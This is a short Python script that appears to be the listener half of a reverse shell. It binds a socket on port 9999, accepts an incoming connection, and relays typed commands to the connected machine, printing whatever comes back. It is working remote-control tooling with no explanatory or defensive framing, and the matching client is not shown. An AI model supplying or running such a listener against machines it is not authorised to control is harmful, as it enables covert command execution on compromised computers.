import socket 
import sys 

# Create a Socket (connect two computers)
def create_socket(): 

    try: 
        global host
        global port 
        global s

        host = ""

        # using an uncommon port
        port = 9999

        s = socket.socket()
    
    except socket.error as msg: 
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections 
def bind_socket():
    
    try: 
        global host
        global port 
        global s

        print("Binding the Port: " + str(port))

        # bind host with port
        s.bind((host, port))

        # listening until tolerated bad connections
        s.listen(5)

    except socket.error as msg: 
        print("Socket creation error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    
    print("Connections has been established! | IP: " + address[0] + " | Port: " + str(address[1]))

    send_commands(conn)

    conn.close()

# Send commands to client
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

if __name__ == "__main__":
    create_socket()
    bind_socket()
    socket_accept()
